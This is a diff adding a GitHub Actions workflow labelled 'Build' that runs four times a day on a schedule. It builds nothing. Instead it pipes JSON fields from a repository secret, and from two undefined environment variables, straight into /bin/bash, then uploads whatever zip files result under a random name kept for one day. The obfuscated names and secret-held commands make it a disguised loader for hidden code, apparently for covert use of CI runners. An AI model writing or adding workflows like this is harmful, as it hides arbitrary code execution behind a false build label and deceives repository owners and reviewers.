@@ -1,0 +1,28 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          bb66: ${{ secrets.bb66 }}
+        run: |
+          printf '%s' "$bb66" | jq -r .v7 | /bin/bash
+          echo $aw728 | jq -r .cjdct918 | /bin/bash
+          printf '%s' "$nqggk069" | jq -r .j042 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: uUDNufZW
+          path: "*.zip"
+          retention-days: 1
